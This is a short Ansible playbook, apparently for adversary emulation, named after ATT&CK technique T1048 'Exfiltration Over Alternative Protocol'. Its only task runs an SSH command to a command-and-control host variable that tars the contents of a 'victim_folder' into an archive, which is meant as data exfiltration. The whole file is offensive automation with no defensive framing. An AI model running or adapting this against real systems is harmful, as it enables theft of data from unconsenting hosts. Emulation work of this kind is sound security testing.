# Playbook-T1048
- name : Exfiltration Over Alternative Protocol
  hosts: linux
  vars_files:
   - /opt/ansible/vars.yaml
  tasks:
          - name: Exfiltration Over Alternative Protocol - SSH
            shell: |
                ssh {{ cnc_fqdn }} "(cd {{ victim_folder }} && tar -zcvf - *) > ./{{ victim_file }}tar.gz"
